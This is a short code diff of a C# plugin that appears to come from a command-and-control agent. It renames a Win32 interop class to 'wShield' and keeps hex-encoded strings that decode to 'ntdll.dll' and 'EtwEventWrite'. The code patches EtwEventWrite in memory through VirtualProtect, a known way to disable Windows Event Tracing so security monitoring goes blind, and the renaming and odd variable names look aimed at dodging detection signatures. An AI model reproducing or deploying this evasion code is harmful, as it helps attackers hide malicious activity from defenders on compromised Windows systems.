@@ -6,7 +6,7 @@ using System.Text;
 
 namespace Plugin
 {
-    class Win32
+    class wShield
     {
         [DllImport("kernel32")]
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -57,7 +57,6 @@ namespace Plugin
                     task_id = (string)args["task-id"],
                     status = "error"
                 };
-
             }
             catch (Exception e)
             {
@@ -77,12 +76,12 @@ namespace Plugin
             {
                 uint uCape;
                 byte[] bSword = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
-                var pShield = Win32.LoadLibrary(Encoding.ASCII.GetString(bSword));
+                var pShield = wShield.LoadLibrary(Encoding.ASCII.GetString(bSword));
 
                 byte[] bShield = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
-                var pMail = Win32.GetProcAddress(pShield, Encoding.ASCII.GetString(bShield));
+                var pMail = wShield.GetProcAddress(pShield, Encoding.ASCII.GetString(bShield));
 
-                Win32.VirtualProtect(pMail, (UIntPtr)bSpear.Length, 0x40, out uCape);
+                wShield.VirtualProtect(pMail, (UIntPtr)bSpear.Length, 0x40, out uCape);
                 Marshal.Copy(bSpear, 0, pMail, bSpear.Length);
                 return true;
             }
@@ -92,5 +91,4 @@ namespace Plugin
             }
         }
     }
-
 }
